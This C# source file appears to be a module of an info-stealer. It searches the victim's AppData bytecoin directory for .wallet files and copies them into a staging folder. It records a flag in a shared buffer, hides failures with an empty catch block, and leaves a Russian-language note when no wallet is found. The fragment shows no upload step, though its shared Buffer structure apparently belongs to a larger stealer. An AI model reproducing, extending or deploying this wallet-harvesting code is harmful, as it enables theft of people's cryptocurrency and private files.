using System.IO;

internal class BTCByte
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}BTC-Bytecoin";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string path = $"{Buffer.path_ad}bytecoin";
			if (Directory.Exists(path))
			{
				FileInfo[] files = new DirectoryInfo(path).GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					if (fileInfo.Extension.Equals(".wallet"))
					{
						fileInfo.CopyTo($"{text}\\{fileInfo.Name}", overwrite: true);
						Buffer.XBufferData[13] = "1";
					}
				}
			}
		}
		catch
		{
		}
		if (Directory.GetFiles(text, "*.wallet").Length == 0)
		{
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Bytecoin не найден на компьютере.");
			Buffer.XBufferData[13] = "0";
		}
	}
}
